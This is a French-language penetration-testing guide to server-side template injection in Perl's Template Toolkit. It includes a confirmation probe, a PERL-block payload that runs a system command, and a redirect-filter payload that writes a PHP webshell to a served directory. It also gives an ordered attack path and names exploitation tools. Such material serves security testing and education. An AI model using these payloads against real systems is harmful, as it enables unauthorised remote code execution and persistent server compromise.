---
title: "Injection de template côté serveur Template Toolkit"
description: "Exploiter la SSTI Template Toolkit (TT2) en Perl : confirmation avec [% 7*7 %], exécution de Perl via les blocs PERL/RAWPERL lorsque EVAL_PERL est défini, et accès à l'exécution de commande via les plugins et filtres."
keywords:
  - SSTI Template Toolkit
  - EVAL_PERL
  - bloc PERL
  - filtre exec
  - injection TT2
---

# Template Toolkit

Template Toolkit (TT2) utilise les directives `[% ... %]`. Confirmez avec `[% 7*7 %]` affichant `49`. TT2 garde le Perl brut derrière l'option `EVAL_PERL`, de sorte que la voie d'exploitation dépend de la façon dont le processeur a été configuré.

Lorsque `EVAL_PERL` est activé, les blocs `PERL` et `RAWPERL` exécutent du Perl arbitraire, ce qui est une RCE directe :

```tt
[% PERL %]
  print `id`;
[% END %]
```

`RAWPERL` se comporte de même avec moins d'enrobage. Les backticks, `system` et `exec` à l'intérieur du bloc exécutent tous des commandes.

Lorsque `EVAL_PERL` est désactivé, tournez-vous vers les filtres et les plugins. Le filtre `redirect` écrit le contenu de son bloc dans un fichier, ce qui dépose un webshell lorsque le chemin de sortie est servi par le web :

```tt
[% FILTER redirect('shell.php') %]<?php system($_GET['c']); ?>[% END %]
```

`redirect` écrit relativement à l'`OUTPUT_PATH` du processeur, donc il requiert que cette option soit définie et que le chemin résultant soit inscriptible et servi. (Le plugin `Datafile`, en revanche, ne fait que lire un fichier d'entrée délimité et n'est pas une primitive d'écriture.) TT2 permettait aussi historiquement d'appeler des méthodes sur des objets placés dans le stash, de sorte qu'une application qui expose un objet doté d'une méthode exécutant une commande ou touchant un fichier élargit la surface accessible.

L'ordre pratique est : confirmer avec `[% 7*7 %]`, essayer un bloc `PERL` (ne fonctionne que sous `EVAL_PERL`), et si cela est bloqué, énumérer les plugins chargeables et tenter l'écriture de fichier `redirect` pour planter un shell. L'injection exige que l'entrée de l'attaquant soit traitée comme texte de template ; les valeurs passées dans un template fixe sont des données. Parce que la voie à fort impact est conditionnée par `EVAL_PERL` et par un `OUTPUT_PATH` inscriptible et servi, évaluez ces conditions avant de noter la découverte.

## Outils

- tplmap, SSTImap

## Références

- Documentation Template Toolkit : PERL/RAWPERL, EVAL_PERL, filtres, plugins
- PortSwigger Web Security Academy: Server-side template injection
